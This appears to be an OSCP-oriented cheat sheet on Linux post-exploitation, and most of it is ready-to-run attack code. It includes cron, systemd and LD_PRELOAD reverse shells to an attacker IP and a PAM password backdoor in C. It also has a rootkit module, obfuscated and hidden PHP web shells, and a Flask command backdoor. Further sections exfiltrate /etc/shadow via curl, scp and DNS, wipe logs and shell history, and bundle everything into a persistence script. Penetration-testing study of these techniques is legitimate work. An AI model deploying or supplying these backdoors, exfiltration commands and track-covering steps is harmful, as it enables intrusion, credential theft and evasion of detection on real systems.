# Linux Post-Exploitation & Persistence

Complete guide for maintaining access and post-exploitation on Linux systems.

---

## Table of Contents
1. [SSH Persistence](#1-ssh-persistence)
2. [Cron Job Persistence](#2-cron-job-persistence)
3. [Systemd Service Persistence](#3-systemd-service-persistence)
4. [PAM Backdoors](#4-pam-backdoors)
5. [LD_PRELOAD Hijacking](#5-ld_preload-hijacking)
6. [Kernel Module Backdoors](#6-kernel-module-backdoors)
7. [Web Shell Persistence](#7-web-shell-persistence)
8. [Data Exfiltration](#8-data-exfiltration)
9. [Covering Tracks](#9-covering-tracks)

---

## 1. SSH Persistence

### 1.1 Authorized Keys

**Add SSH Key:**
```bash
# Generate key on attacker
ssh-keygen -t ed25519 -f ~/.ssh/oscp_key -N ""

# Copy public key
cat ~/.ssh/oscp_key.pub

# On target
echo "ssh-ed25519 AAAAC3... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Stealth:**
```bash
# Hide in middle of file
sed -i '5i ssh-ed25519 AAAAC3... root@localhost' ~/.ssh/authorized_keys

# Use legitimate-looking key name
echo "ssh-ed25519 AAAAC3... admin@prod-server" >> ~/.ssh/authorized_keys
```

---

### 1.2 SSH Config Backdoor

**Modify sshd_config:**
```bash
# Allow root login
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Allow password authentication
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Reload SSH
systemctl reload sshd
```

---

### 1.3 SSH Wrapper

**Replace SSH Binary:**
```bash
# Backup original
cp /usr/sbin/sshd /usr/sbin/sshd.bak

# Create wrapper
cat > /usr/sbin/sshd_wrapper << 'EOF'
#!/bin/bash
password="SecretBackdoorPass123"
if [ "$1" == "$password" ]; then
    /bin/bash -i
else
    /usr/sbin/sshd.bak "$@"
fi
EOF

chmod +x /usr/sbin/sshd_wrapper
mv /usr/sbin/sshd_wrapper /usr/sbin/sshd
```

**Usage:**
```bash
ssh root@target SecretBackdoorPass123
```

---

## 2. Cron Job Persistence

### 2.1 User Crontab

**Add Reverse Shell:**
```bash
# Every 5 minutes
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1'") | crontab -

# Every reboot
(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden/backdoor.sh") | crontab -

# Daily at 3 AM
(crontab -l 2>/dev/null; echo "0 3 * * * /usr/local/bin/update.sh") | crontab -
```

**Stealth:**
```bash
# Use uncommon timing
echo "17 4 * * * /usr/bin/python3 /opt/.system/check.py" | crontab -

# Hide in system cron
echo "*/10 * * * * root /bin/bash /var/tmp/.update" >> /etc/crontab
```

---

### 2.2 System Cron Directories

**Locations:**
```
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/
/var/spool/cron/crontabs/
```

**Deploy:**
```bash
# Create daily backdoor
cat > /etc/cron.daily/system-update << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' &
EOF

chmod +x /etc/cron.daily/system-update
```

---

## 3. Systemd Service Persistence

### 3.1 Create Systemd Service

**Service File:**
```bash
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1'
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

---

### 3.2 Modify Existing Service

**Hijack Service:**
```bash
# Find low-priority service
systemctl list-units --type=service

# Modify
systemctl edit cups.service

# Add reverse shell to ExecStart
[Service]
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1'
```

---

### 3.3 Timer-Based Persistence

**Create Timer:**
```bash
# Service
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/backdoor.sh
EOF

# Timer (every 10 minutes)
cat > /etc/systemd/system/backdoor.timer << 'EOF'
[Unit]
Description=Backdoor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min

[Install]
WantedBy=timers.target
EOF

systemctl enable backdoor.timer
systemctl start backdoor.timer
```

---

## 4. PAM Backdoors

### 4.1 PAM Backdoor Module

**Theory:**
- PAM (Pluggable Authentication Modules)
- Intercept authentication
- Allow backdoor password

**Create Backdoor:**
```c
// pam_backdoor.c
#include <security/pam_modules.h>
#include <string.h>

#define BACKDOOR_PASS "SuperSecretPass123"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (strcmp(password, BACKDOOR_PASS) == 0) {
        return PAM_SUCCESS;  // Allow access!
    }

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

**Compile & Deploy:**
```bash
# Compile
gcc -fPIC -c pam_backdoor.c
gcc -shared -o pam_backdoor.so pam_backdoor.o -lpam

# Install
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Configure
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/common-auth
```

**Usage:**
```bash
# SSH with backdoor password
ssh user@target
Password: SuperSecretPass123
# Access granted!
```

---

### 4.2 Detection & Cleanup

**Detect:**
```bash
# Check PAM configs
grep -r "pam_backdoor" /etc/pam.d/

# Remove
rm /lib/x86_64-linux-gnu/security/pam_backdoor.so
sed -i '/pam_backdoor/d' /etc/pam.d/common-auth
```

---

## 5. LD_PRELOAD Hijacking

### 5.1 Theory

**How It Works:**
- `LD_PRELOAD`: Load library before others
- Hijack function calls
- Execute malicious code

---

### 5.2 Create Malicious Library

**Example:**
```c
// malicious.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // Executed when library loads
    unsetenv("LD_PRELOAD");  // Hide ourselves
    system("bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' &");
}

// Hijack common function
int getuid() {
    return 0;  // Always return root!
}
```

**Compile:**
```bash
gcc -shared -fPIC malicious.c -o malicious.so
```

---

### 5.3 Deploy

**Method 1: User-Level**
```bash
# Add to user profile
echo "export LD_PRELOAD=/lib/malicious.so" >> ~/.bashrc
```

**Method 2: System-Level**
```bash
# ld.so.preload
echo "/lib/malicious.so" > /etc/ld.so.preload
```

**Method 3: SUID Binary**
```bash
# Hijack sudo or other SUID binaries
export LD_PRELOAD=/tmp/malicious.so
sudo ls  # Triggers backdoor
```

---

## 6. Kernel Module Backdoors

### 6.1 Rootkit Basics

**Warning:** Kernel modules are powerful but risky!

**Simple Kernel Module:**
```c
// rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    // Hide processes, files, network connections
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Rootkit");
```

**Compile:**
```bash
# Requires kernel headers
apt-get install linux-headers-$(uname -r)

# Makefile
obj-m += rootkit.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

# Build
make

# Load
insmod rootkit.ko
```

---

### 6.2 Detection

**Detect Loaded Modules:**
```bash
lsmod | grep -v "$(cat /proc/modules | awk '{print $1}')"
```

**Remove:**
```bash
rmmod rootkit
```

---

## 7. Web Shell Persistence

### 7.1 PHP Web Shells

**Simple Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Obfuscated:**
```php
<?php
$a = str_rot13('flfgrz');  // 'system'
$a($_GET['c']);
?>
```

**Deploy:**
```bash
# Upload to webroot
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.config.php

# Hidden in legitimate file
echo '<?php /*' >> /var/www/html/config.php
echo 'system($_GET["debug"]);' >> /var/www/html/config.php
echo '*/ ?>' >> /var/www/html/config.php
```

---

### 7.2 Python Flask Backdoor

**Flask Shell:**
```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/api/debug')
def debug():
    cmd = request.args.get('cmd', '')
    output = subprocess.check_output(cmd, shell=True)
    return output

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## 8. Data Exfiltration

### 8.1 SSH Tunneling

**Exfiltrate Data:**
```bash
# Compress and exfiltrate
tar czf - /root | ssh user@10.10.10.100 "cat > /tmp/exfil.tar.gz"

# Direct copy
scp -r /etc/shadow user@10.10.10.100:/tmp/
```

---

### 8.2 Base64 Exfiltration

**Encode & Exfiltrate:**
```bash
# Encode file
base64 /etc/shadow | curl -X POST -d @- http://10.10.10.100:8000/

# On attacker
nc -lvnp 8000 > shadow.b64
base64 -d shadow.b64 > shadow
```

---

### 8.3 DNS Exfiltration

**Split & Send:**
```bash
# Split file into DNS queries
xxd -p /etc/passwd | while read line; do
    dig $line.exfil.attacker.com
done
```

---

## 9. Covering Tracks

### 9.1 Clear Logs

**System Logs:**
```bash
# Clear all logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp

# Clear specific entries
sed -i '/10.10.10.100/d' /var/log/auth.log
```

---

### 9.2 Clear Command History

**Bash:**
```bash
# Clear current session
history -c

# Clear history file
cat /dev/null > ~/.bash_history

# Disable history
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

# Per-command stealth
<space>command  # Leading space prevents history
```

---

### 9.3 Timestomping

**Match Timestamps:**
```bash
# Copy timestamp from /bin/ls
touch -r /bin/ls /tmp/backdoor.sh
```

---

### 9.4 Remove Artifacts

**Cleanup Script:**
```bash
#!/bin/bash
# cleanup.sh

# Remove payloads
rm -rf /tmp/.hidden
rm /var/tmp/.update

# Clear logs
cat /dev/null > /var/log/auth.log

# Clear history
cat /dev/null > ~/.bash_history
history -c

# Remove script itself
rm -- "$0"
```

---

## 10. OSCP Practical Examples

### Quick Persistence Script:
```bash
#!/bin/bash
# persist.sh - Multi-method persistence

# 1. SSH key
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... kali@oscp" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 2. Cron job
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1'") | crontab -

# 3. Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=Update Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
systemctl start update.service

echo "[+] Persistence established!"
```

---

## 11. Detection Summary

| Persistence Method | Detection Difficulty | OSCP Relevance |
|--------------------|---------------------|----------------|
| **SSH Keys** | Low | ✅ High |
| **Cron Jobs** | Medium | ✅ High |
| **Systemd Services** | Medium | ✅ High |
| **PAM Backdoors** | High | ⚠️ Advanced |
| **LD_PRELOAD** | Medium | ⚠️ Medium |
| **Kernel Modules** | Very High | ❌ Low (risky) |

---

## 12. References
- Linux Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PAM Backdoors: https://www.offensive-security.com/
- Persistence Techniques: MITRE ATT&CK T1547, T1053

---

**OSCP Note:** Focus on SSH keys, cron jobs, and systemd services. Have persistence scripts ready for post-exploitation. Always document what you deploy for cleanup later!
